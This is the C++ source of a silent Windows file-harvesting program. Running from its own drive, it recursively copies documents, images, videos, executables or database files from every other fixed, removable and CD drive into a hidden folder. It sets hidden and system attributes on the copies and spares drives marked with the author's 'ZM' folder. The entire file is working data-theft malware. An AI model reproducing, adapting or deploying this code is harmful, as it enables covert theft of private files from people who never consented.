//---------------------------------------------------------------------------

#include <vcl.h>
#include <windows.h>

#include <dir.h>
#include "Main_Unit.h"

#pragma hdrstop




//---------------------------------------------------------------------------

#pragma argsused
WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

        // initialisation
        
        if(Load_Config("config"))
        {
                Local_Disks = Config->Strings[0];
                Removable_Disks = Config->Strings[1];
                Cds = Config->Strings[2];
                Target_Dir = "\\" + Config->Strings[3];
                Enabled = Config->Strings[4];
        }
        else//load default config
        {
                Local_Disks = "67";
                Removable_Disks = "67";
                Cds = "67";
                Target_Dir = "\\tmp";
                Enabled = "0";
        }

        if(Enabled == 0)
        {
                return 0; // sortir du programme
        }

        Current_Dir = GetCurrentDir();// repertoire courent.
        Current_Drive = Current_Dir.SubString(0,2);


        if(!CreateDir(Current_Dir + Target_Dir)) // problème dans la creation du repertoire
        {
                if(! DirectoryExists(Current_Dir + Target_Dir)) //le repertoire est introuvable
                {
                        return 0; // sortir du programme
                }
        }

        AnsiString Drive;

        for (int i= 0; i < 26;i++)
        {
                Drive = "a";
                Drive.c_str()[0]  = i + 'a';
                Drive = Drive + ":\\";
                if((GetDriveType(Drive.c_str())== DRIVE_FIXED) && (Not_My_Disk(Drive.SubString(0,2))))
                {
                           Drive = Drive.SubString(0,2);

                           if(Local_Disks !="0")
                           {
                                if(Local_Disks =="6")//all files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.*", 1, 1);
                                }
                                else if(Local_Disks =="67")//all files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.*", 1, 0);
                                }
                                else if(Local_Disks =="1")//office files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.doc", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.docx", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xls", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xlsx", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 1);
                                }
                                else if(Local_Disks =="17")//office files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.doc", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.docx", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xls", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xlsx", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 0);
                                }
                                else if(Local_Disks =="2")//image files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.bmp", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.png", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.gif", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpeg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpe", 1, 1);
                                }
                                else if(Local_Disks =="27")//image files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.bmp", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.png", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.gif", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpeg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpe", 1, 0);
                                }
                                else if(Local_Disks =="3")//video files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.avi", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.flv", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.3gp", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mp4", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpeg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.wmv", 1, 1);
                                }
                                else if(Local_Disks =="37")//video files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.avi", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.flv", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.3gp", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mp4", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpeg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.wmv", 1, 0);
                                }
                                else if(Local_Disks =="4")//executable files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.exe", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.com", 1, 1);
                                }
                                else if(Local_Disks =="47")//executable files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.exe", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.com", 1, 0);

                                }
                                else if(Local_Disks =="5")//db files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.dbf", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.db", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 1);
                                }
                                else if(Local_Disks =="57")//db files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.dbf", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.db", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 0);

                                }
                           }
                }
                else if((GetDriveType(Drive.c_str())== DRIVE_REMOVABLE) && ((Current_Drive+"\\").LowerCase() != (Drive).LowerCase()) && (Not_My_Disk(Drive.SubString(0,2))))
                {
                           Drive = Drive.SubString(0,2);

                           if(Removable_Disks !="0")
                           {
                                if(Removable_Disks == "6")//all files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.*", 1, 1);
                                }
                                else if(Removable_Disks =="67")//all files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.*", 1, 0);
                                }
                                else if(Removable_Disks =="1")//office files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.doc", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.docx", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xls", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xlsx", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 1);
                                }
                                else if(Removable_Disks =="17")//office files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.doc", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.docx", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xls", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xlsx", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 0);
                                }
                                else if(Removable_Disks =="2")//image files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.bmp", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.png", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.gif", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpeg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpe", 1, 1);
                                }
                                else if(Removable_Disks =="27")//image files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.bmp", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.png", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.gif", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpeg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpe", 1, 0);
                                }
                                else if(Removable_Disks =="3")//video files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.avi", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.flv", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.3gp", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mp4", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpeg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.wmv", 1, 1);
                                }
                                else if(Removable_Disks =="37")//video files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.avi", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.flv", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.3gp", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mp4", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpeg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.wmv", 1, 0);
                                }
                                else if(Removable_Disks =="4")//executable files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.exe", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.com", 1, 1);
                                }
                                else if(Removable_Disks =="47")//executable files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.exe", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.com", 1, 0);

                                }
                                else if(Removable_Disks =="5")//db files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.dbf", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.db", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 1);
                                }
                                else if(Removable_Disks =="57")//db files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.dbf", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.db", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 0);
                                }
                           }
                }
                else if(GetDriveType(Drive.c_str())== DRIVE_CDROM)
                {
                           Drive = Drive.SubString(0,2);

                           if(Cds !="0")
                           {
                                if(Cds =="6")//all files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.*", 1, 1);
                                }
                                else if(Cds =="67")//all files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.*", 1, 0);
                                }
                                else if(Cds =="1")//office files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.doc", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.docx", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xls", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xlsx", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 1);
                                }
                                else if(Cds =="17")//office files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.doc", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.docx", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xls", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.xlsx", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 0);
                                }
                                else if(Cds =="2")//image files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.bmp", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.png", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.gif", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpeg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpe", 1, 1);
                                }
                                else if(Cds =="27")//image files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.bmp", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.png", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.gif", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpeg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.jpe", 1, 0);
                                }
                                else if(Cds =="3")//video files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.avi", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.flv", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.3gp", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mp4", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpeg", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.wmv", 1, 1);
                                }
                                else if(Cds =="37")//video files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.avi", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.flv", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.3gp", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mp4", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mpeg", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.wmv", 1, 0);
                                }
                                else if(Cds =="4")//executable files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.exe", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.com", 1, 1);
                                }
                                else if(Cds =="47")//executable files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.exe", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.com", 1, 0);

                                }
                                else if(Cds =="5")//db files without skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.dbf", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.db", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 1);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 1);
                                }
                                else if(Cds =="57")//db files with skiping system dirs
                                {
                                        get_files(Drive,Current_Dir + Target_Dir , "*.dbf", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.db", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdb", 1, 0);
                                        get_files(Drive,Current_Dir + Target_Dir , "*.mdbx", 1, 0);
                                }
                           }
                }

        }


        return 0;
}
//---------------------------------------------------------------------------

//int index =0;
void get_files(AnsiString src_directory, AnsiString des_directory, AnsiString files_type, bool get_sub_dir, bool system_dirs_files)
{
        AnsiString src_path = "";
        AnsiString des_path = "";

        AnsiString Type = files_type.SubString(2,files_type.Length()-1);

        SetFileAttributes(des_directory.c_str(),FILE_ATTRIBUTE_NORMAL );

        TSearchRec sr;
        if(FindFirst(src_directory + "\\*.*", faAnyFile , sr) == 0)
        {
                do
                {       if((sr.Attr & faDirectory) != faDirectory)
                        {
                                if((sr.Name != "AUTOEXEC.BAT") && (sr.Name != "boot.ini") && (sr.Name != "Bootfont.bin")
                                        && (sr.Name != "CONFIG.SYS") && (sr.Name != "IO.SYS")
                                        && (sr.Name != "MSDOS.SYS") && (sr.Name != "NTDETECT.COM") && (sr.Name != "ntldr")
                                        && (sr.Name != "pagefile.sys") && ((sr.Name.Pos(Type)>0) || (files_type =="*.*")) )
                                {

                                        src_path = src_directory + "\\" + sr.Name;
                                        des_path = des_directory + "\\" + sr.Name;//IntToStr(index);
                                        CopyFile(src_path.c_str(), des_path.c_str(),1);
                                        if(FileExists(des_path))
                                        {
                                              SetFileAttributes(des_path.c_str(),FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
                                              //index++;
                                        }
                                }

                        }
                        else
                        {

                                if(get_sub_dir)
                                {

                                        if(system_dirs_files)
                                        {
                                                if((sr.Name != ".")&& (sr.Name != ".."))
                                                {
                                                        AnsiString new_src_directory = src_directory + "\\" + sr.Name;
                                                        AnsiString new_des_directory = des_directory + "\\" + sr.Name;

                                                        CreateDir(new_des_directory);
                                                        get_files(new_src_directory, new_des_directory, files_type,get_sub_dir, system_dirs_files);
                                                }
                                        }else
                                        {
                                                if((sr.Name != "RECYCLER")
                                                && (sr.Name != "System Volume Information")
                                                && (sr.Name != "WINDOWS")
                                                && (sr.Name != "MSOCache")
                                                && (sr.Name != "Program Files")
                                                && (sr.Name != "MSOCache")
                                                && (sr.Name != "Program Files"))
                                                {
                                                        if((sr.Name != ".")&& (sr.Name != ".."))
                                                        {
                                                                AnsiString new_src_directory = src_directory + "\\" + sr.Name;
                                                                AnsiString new_des_directory = des_directory + "\\" + sr.Name;

                                                                CreateDir(new_des_directory);
                                                                get_files(new_src_directory, new_des_directory, files_type,get_sub_dir, system_dirs_files);
                                                        }
                                                }
                                         }
                                }

                        }

                } while (FindNext(sr) == 0 );
                FindClose(sr);
        }

        SetFileAttributes(des_directory.c_str(),FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
}


AnsiString __fastcall GetUser()
{
        AnsiString user("");
        DWORD t_user(256);
        char *name_user=new char[t_user];
        if( GetUserName(name_user, &t_user) )
        {
                user=AnsiString(name_user);
        }
        delete[] name_user;
        return user;
}

bool Load_Config(AnsiString Config_File_Name)
{
        Config = new TStringList;
        if(!FileExists(Config_File_Name))
        {
                return false;
        }
        else
        {
                Config->LoadFromFile(Config_File_Name);
                Config->Delete(0);
                Config->Delete(1);
                Config->Delete(2);
                Config->Delete(3);
                Config->Delete(4);
                return true;
        }


}
// to protect my Disks
bool Not_My_Disk(AnsiString Drv)
{
        AnsiString ZM_Dir = Drv +"\\ZM";

        if(DirectoryExists(ZM_Dir))
        {
                return false;
        }
        else
        {
                return true;
        }
}




